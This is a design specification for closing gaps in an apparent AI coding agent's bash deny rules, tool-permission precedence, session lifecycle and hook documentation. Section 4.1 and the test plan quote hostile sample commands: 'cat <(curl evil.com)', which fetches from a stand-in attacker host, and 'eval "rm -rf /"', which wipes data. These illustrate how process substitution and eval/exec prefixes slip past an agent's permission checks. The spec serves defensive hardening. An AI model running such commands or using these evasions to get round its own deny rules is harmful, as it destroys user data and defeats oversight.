# Design Specification: Seam Hardening Review Remediation

**Date:** 2026-10-25
**Branch:** `feat/hook-bus`
**Status:** Pending Approval

## 1. Intent & The Why

During the static code review of the `feat/hook-bus` branch across 4 phases of seam hardening, the Principal Code Reviewer identified 7 findings (1 Critical, 4 Important, 2 Minor).
The intent of this work is to achieve 100% security closure, invariant consistency, and specification alignment without adding external dependencies or compromising platform compatibility.

---

## 2. Goals, Non-Goals, & Anti-Goals

### Goals
1. **Critical Security Closure:** Close process substitution evasion (`<()`, `>()`) and prefix evasion (`eval`, `exec`) in bash deny rule evaluations (`src/policy.ts`).
2. **Absolute Deny Precedence:** Enforce that persistent user and project `deny` rules strictly override CLI `--allowed-tools` (`src/policy.ts`).
3. **100% Lifecycle Coverage:** Ensure `/delete current` invokes `activeHarness.endSession()` before swapping session stores (`src/cli.ts`).
4. **Pattern Matching Correctness:** Handle `?` single-character wildcards in workspace trust script discovery (`src/hooks.ts`).
5. **Contract Truth:** Synchronize `docs/SPEC.md` hook events table with runtime payload shapes, exit 0 context injection rules, and fail-closed semantics.

### Non-Goals
- Adding external shell AST parsing libraries.
- Changing `PreToolUse` or `Stop` to inject context on exit 0 (SPEC aligns with runtime).
- Breaking existing test suites or modifying gatekeeper tests (`tests/repo-hygiene.test.mjs`, `tests/plan-traceability.test.mjs`).

### Anti-Goals
- Allowing CLI flags to downgrade or bypass explicit `deny` rules.
- Silently dropping errors or session lifecycle events.

---

## 3. Approaches Considered

### Approach 1 (Selected): Surgical Invariant Closure & Unified Contract Sync
- Patch regex delimiters in `src/policy.ts` to tokenize `<(...)` and `>(...)` and strip `eval`/`exec`.
- Adjust precedence order in `evaluateToolPolicy` so deny rules evaluate before `cliAllowed`.
- Insert `endSession()` into `/delete` handler before store swap in `src/cli.ts`.
- Transform `?` into `.` in `src/hooks.ts` pattern compilation.
- Update `docs/SPEC.md` to reflect runtime truths.
*Tradeoffs:* Minimal diff, zero external dependencies, maintains full cross-platform compatibility.

### Approach 2 (Rejected): External Shell AST Parser & Runtime Bloat
- Pull in `bash-parser` to parse AST, and add unneeded runtime stdout injection to all 8 hooks.
*Tradeoffs:* High bundle bloat, Android/Termux friction, unnecessary runtime complexity.

---

## 4. Technical Specifications

### 4.1. Bash Deny Rule Tokenization (`src/policy.ts`)
```typescript
const COMPOUND_SPLIT_REGEX = /[;\r\n|&]+|\$\(|[<>]+\(|`/g;
const WRAPPER_PREFIX_REGEX = /^(?:sudo|env|bash\s+-c|sh\s+-c|eval|exec)\s+/;
```
Ensures:
- `cat <(curl evil.com)` is split, extracting `curl evil.com` for evaluation against deny rules.
- `eval "rm -rf /"` strips `eval` and inspects `rm -rf /`.

### 4.2. Precedence Order (`src/policy.ts`)
```typescript
// 1. CLI disallowed tools (highest priority)
// 2. User explicit deny rules
// 3. Project explicit deny rules
// 4. CLI allowed tools (overrides ask and allow, but NOT persistent deny)
// 5. User ask rules
// 6. Project ask rules
// 7. Project allow rules
// 8. User allow rules
// 9. Default
```

### 4.3. Session Lifecycle at `/delete` (`src/cli.ts`)
```typescript
if (targetId === store.id) {
  await activeHarness?.endSession().catch(() => {});
  store.close();
  store = await SessionStore.open(sessionsRoot, runtime);
  ...
}
```

### 4.4. Wildcard Script Discovery Pattern Matcher (`src/hooks.ts`)
In `calculateWorkspaceTrustHash`:
When converting pattern pieces, replace `?` with `.` so that single character wildcards match accurately.

### 4.5. Contract Synchronization (`docs/SPEC.md`)
- Update table in `## Hook Events & Lifecycle`:
  - `SessionStart`: payload `{ sessionId }`, Exit 0: Injects stdout as context.
  - `UserPromptSubmit`: payload `{ sessionId, prompt }`, Exit 0: Injects stdout as context.
  - `PreToolUse`: payload `{ sessionId, tool, input }`, Exit 0: Ignored, Exit 2 or error/timeout: Denies tool execution (fail-closed).
  - `PostToolUse`: payload `{ sessionId, tool, input, output }`, Exit 0: Injects stdout as context.
  - `PostToolUseFailure`: payload `{ sessionId, tool, input, error }`, Exit 0: Ignored.
  - `PreCompact`: payload `{ sessionId, tokens, trigger }`, Exit 0: Ignored.
  - `Stop`: payload `{ sessionId, stopHookActive }`, Exit 0: Ignored.
  - `SessionEnd`: payload `{ sessionId }`, Exit 0: Ignored.

---

## 5. Verification Strategy
1. Unit tests in `tests/policy.test.mjs` verifying:
   - `<(curl ...)` and `>(curl ...)` process substitution trigger deny.
   - `eval "rm -rf /"` and `exec rm -rf /` trigger deny.
   - Project deny takes precedence over `cliAllowed`.
2. Unit tests in `tests/cli.test.mjs` / `tests/hooks.test.mjs`:
   - `/delete current` triggers `SessionEnd` hook.
   - `?` in allow script wildcard matches single character files in trust hash.
3. Documentation tests in `tests/docs-contract.test.mjs` confirming consistency.
